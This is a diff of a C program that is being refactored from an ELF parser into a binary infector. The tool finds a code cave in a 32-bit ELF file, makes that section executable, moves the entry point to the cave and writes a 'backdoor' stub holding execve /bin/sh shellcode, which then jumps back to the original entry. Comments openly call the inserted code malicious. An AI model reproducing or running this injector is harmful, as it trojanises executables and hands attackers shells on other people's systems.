@@ -5,8 +5,8 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 
-#define DEBUG1
 //#define DEBUG2
+//#define VERBOSE
 
 // Prototypes
 
@@ -340,7 +340,6 @@ char *findLongestCave(char *codeSec, int secSize, int *codecaveSize){
 /* Main entry point of elf-parser */
 int32_t main(int32_t argc, char *argv[])
 {
-
 	int32_t fd;
 	Elf32_Ehdr eh;		/* elf-header is fixed size */
 
@@ -349,8 +348,7 @@ int32_t main(int32_t argc, char *argv[])
 		return 0;
 	}
 
-	fd = open(argv[1], O_RDONLY|O_SYNC);
-	if(fd<0) {
+	if((fd = open(argv[1], O_RDONLY|O_SYNC)) < 0) {
 		printf("Error %d Unable to open %s\n", fd, argv[1]);
 		return 0;
 	}
@@ -360,156 +358,71 @@ int32_t main(int32_t argc, char *argv[])
 	if(!is_ELF(eh)) {
 		return 0;
 	}
-	if(is64Bit(eh)){
-		Elf64_Ehdr eh64;	/* elf-header is fixed size */
-		Elf64_Shdr* sh_tbl;	/* section-header table is variable size */
 
-		read_elf_header64(fd, &eh64);
-		print_elf_header64(eh64);
+	Elf32_Shdr *sh_tbl;	/* section-header table is variable size */
+	
+	#ifdef VERBOSE
+	print_elf_header(eh);
+	#endif
 
-		/* Section header table :  */
-		sh_tbl = malloc(eh64.e_shentsize * eh64.e_shnum);
-		if(!sh_tbl) {
-			printf("Failed to allocate %d bytes\n",
-					(eh64.e_shentsize * eh64.e_shnum));
-		}
-		read_section_header_table64(fd, eh64, sh_tbl);
-		print_section_headers64(fd, eh64, sh_tbl);
-
-		/* Symbol tables :
-		 * sh_tbl[i].sh_type
-		 * |`- SHT_SYMTAB
-		 *  `- SHT_DYNSYM
-		 */
-		print_symbols64(fd, eh64, sh_tbl);
-
-		/* Save .text section as text.S
-		*/
-		save_text_section64(fd, eh64, sh_tbl);
-
-		/* Disassemble .text section
-		 * Logs asm instructions to stdout
-		 * Currently supports ARMv7
-		 */
-		disassemble64(fd, eh64, sh_tbl);
-
-	} else{
-		Elf32_Shdr *sh_tbl;	/* section-header table is variable size */
-		print_elf_header(eh);
-
-		/* Section header table :  */
-		sh_tbl = malloc(eh.e_shentsize * eh.e_shnum);
-		
-		if(!sh_tbl) {
-			printf("Failed to allocate %d bytes\n",
-					(eh.e_shentsize * eh.e_shnum));
-		}
-
-		read_section_header_table(fd, eh, sh_tbl);
-		print_section_headers(fd, eh, sh_tbl);
-
-		puts("END");
-
-		char *patchName = getPatchedName(argv[1]);
-		printf("Pathced name = %s\n", patchName);
-		duplicateFile(argv[1], patchName);
-		int patchFD = open(patchName, O_RDWR);
-		
-		//writeFileHeader(patchFD, &eh);
-		//writeSectionTable(patchFD, &eh, sh_tbl);
-		makeSectionExecutable(".data", fd, eh, sh_tbl);
-		writeSectionTable(patchFD, &eh, sh_tbl);
-
-		//int readByts;
-		//char *codeSection = extractCodeSection(fd, eh, sh_tbl, &readByts);
-
-		puts("================ CODE CAVES ================");
-
-		//int caveSize;
-		//char *cave = findLongestCave(codeSection, readByts, &caveSize);
-		
-		int cavesNum;
-		codecave *caves = searchCodecaves(fd, eh, sh_tbl, &cavesNum);
-		printf("Caves found: %d\n", cavesNum);
-
-		if (cavesNum > 0) codecave_summary(caves, cavesNum);
-
-		codecave *winner = getWinnerCodecave(caves, cavesNum);
-
-		// Make the winner section executable
-		makeSectionExecutable(winner->secName, patchFD, eh, sh_tbl);
-
-		// Change entry point to new cave
-		Elf32_Addr oldEntryPoint = eh.e_entry;
-		eh.e_entry = calcCaveVirtualAddress(winner, patchFD, eh, sh_tbl);
-		writeFileHeader(patchFD, &eh);
-		//int restorationJumpOffset = eh.e_entry - oldEntryPoint;
-
-		// Generating malicious code
-		char oldAddr[4];
-		memcpy(&oldAddr, &oldEntryPoint, 4);
-		int newEntryPointSize;
-		littleEndianToBigEndian(oldAddr, 4);
-
-		char payload[21] = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
-
-		char *malEntryPointCode = generateBackdoorCode(oldAddr, payload, sizeof(payload), &newEntryPointSize);
-
-		if(newEntryPointSize > winner->length) {
-			puts("Code injection isn't possible!");
-			exit(1);
-		}
-
-		// Write malicious code to code cave
-		lseek(patchFD, (off_t)winner->physicalOffset, SEEK_SET);
-		write(patchFD, (void *)malEntryPointCode, newEntryPointSize);
-
-		printf("entrypoint = 0x%x\n", eh.e_entry);
-
-		// TODO: Make this copy the org file and only change the fields instead of copynig individualy
-
-		// < ========  CAVE CODE END  ======== >
-
-		#ifdef DEBUG2
-		x86ByteInstruction inst = assembleJMPInstruction(-2074839463);
-		if(errno != 1){
-			puts("AAAA");
-			//write(1, inst.additionalCode, 4);
-			int fff = open("test", O_CREAT | O_RDWR);
-			write(fff, inst.additionalCode, inst.additionalSize);
-			close(fff);
-			puts("AAAA");
-		}
-		#else
-		if (errno != 0){
-			exit(errno);
-		}
-		#endif
-
-
-		exit(0);
-
-
-
-		/* Symbol tables :
-		 * sh_tbl[i].sh_type
-		 * |`- SHT_SYMTAB
-		 *  `- SHT_DYNSYM
-		 */
-		print_symbols(fd, eh, sh_tbl);
-
-		/* Save .text section as text.S
-		*/
-		save_text_section(fd, eh, sh_tbl);
-
-		/* Disassemble .text section
-		 * Logs asm instructions to stdout
-		 * Currently supports ARMv7
-		 */
-		disassemble(fd, eh, sh_tbl);
+	/* Section header table :  */
+	sh_tbl = malloc(eh.e_shentsize * eh.e_shnum);
+	
+	if(!sh_tbl) {
+		printf("Failed to allocate %d bytes\n",
+				(eh.e_shentsize * eh.e_shnum));
+		exit(1);
 	}
 
-	return 0;
+	read_section_header_table(fd, eh, sh_tbl);
 
+	char *patchName = getPatchedName(argv[1]);
+	duplicateFile(argv[1], patchName);
+	int patchFD = open(patchName, O_RDWR);
+	
+	int cavesNum;
+	codecave *caves = searchCodecaves(fd, eh, sh_tbl, &cavesNum);
+
+	#ifdef VERBOSE
+	printf("Caves found: %d\n", cavesNum);
+	#endif
+
+	#ifdef VERBOSE
+	if (cavesNum > 0) codecave_summary(caves, cavesNum);
+	#endif
+
+	codecave *winner = getWinnerCodecave(caves, cavesNum);
+
+	// Make the winner section executable
+	makeSectionExecutable(winner->secName, patchFD, eh, sh_tbl);
+
+	// Change entry point to new cave
+	Elf32_Addr oldEntryPoint = eh.e_entry;
+	eh.e_entry = calcCaveVirtualAddress(winner, patchFD, eh, sh_tbl);
+	writeFileHeader(patchFD, &eh);
+
+	// Generating malicious code
+	char oldAddr[4];
+	memcpy(&oldAddr, &oldEntryPoint, 4);
+	int newEntryPointSize;
+	littleEndianToBigEndian(oldAddr, 4);
+
+	char payload[21] = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
+
+	char *malEntryPointCode = generateBackdoorCode(oldAddr, payload, sizeof(payload), &newEntryPointSize);
+
+	if(newEntryPointSize > winner->length) {
+		puts("Code injection isn't possible!");
+		exit(1);
+	}
+
+	// Write malicious code to code cave
+	lseek(patchFD, (off_t)winner->physicalOffset, SEEK_SET);
+	write(patchFD, (void *)malEntryPointCode, newEntryPointSize);
+
+	#ifdef VERBOSE
+	printf("entrypoint = 0x%x\n", eh.e_entry);
+	#endif
+
+	exit(0);
 }
-
